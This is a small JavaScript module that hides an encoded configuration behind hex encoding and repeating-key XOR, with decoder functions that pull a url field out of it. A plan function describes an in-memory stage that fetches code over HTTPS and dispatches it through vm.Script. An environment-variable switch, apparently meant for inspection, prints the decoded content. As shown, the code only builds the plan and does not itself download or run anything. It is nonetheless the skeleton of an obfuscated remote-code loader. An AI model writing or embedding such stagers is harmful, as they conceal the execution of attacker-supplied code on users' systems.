const moduleShape = Object.freeze({ format: "commonjs" });

const Material_45975546 = "d0223303c5d27a720c8bc77c730adfd47a5d0dd3cb70761a9ac276710fd7d27c6a20dbc3726d0dcfda7e661ec6d27a7042ded26b720ce9d2776711e9d0727e0cc2c7786720d5c96a6c0b8b9763611edbd67e6b18d8f9766642f8e95b475285935b464ff3945e7e0ac4ca226a0bc2d66c385099c870661a9b952a661b86c32d6349839e2f2c1acec7727213d388766c09d7ca766650d7d6767e0ac5c36d5d1ed1c3717642f8c97b673ec3c276765085937b66";

const Codec_45975546 = "hex_buffer|repeating_key_xor|a6,1f,02,7f,b6";



function load_45975546() { return [...Buffer.from(Material_45975546, "hex")]; }

function decode_45975546(v_a19c) { const keyBytes = [166,31,2,127,182]; return v_a19c.map((value, index) => value ^ keyBytes[index % keyBytes.length]); }

async function recover_45975546() {

  const v_c304 = { ...{ north: 1 }, south: 2 };

  const v_a19c = load_45975546(); let v_b27e = [];

  v_b27e = await Promise.resolve(v_a19c).then(decode_45975546);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_45975546() { return Buffer.from(await recover_45975546(), "utf8").toString("utf8"); }

async function plan_45975546() { const inspect = inspect_45975546; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_45975546;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_45975546());

